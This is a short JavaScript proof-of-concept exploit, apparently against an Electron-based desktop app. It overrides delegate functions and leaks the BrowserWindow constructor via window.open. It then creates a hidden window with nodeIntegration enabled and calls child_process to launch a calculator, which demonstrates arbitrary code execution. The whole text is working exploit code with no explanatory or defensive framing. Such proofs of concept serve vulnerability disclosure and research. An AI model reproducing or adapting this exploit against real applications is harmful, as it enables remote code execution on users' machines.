window.desktop.delegate = {}
window.desktop.delegate.canOpenURLInWindow = () => true
window.desktop.window = {}
window.desktop.window.open = () => 1
bw = window.open('about:blank') // leak BrowserWindow class
nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}})
nbw.loadURL('about:blank') // need to load some URL for interaction
nbw.webContents.executeJavaScript("this.require('child_process').execFile('/usr/bin/gnome-calculator',function(){})")
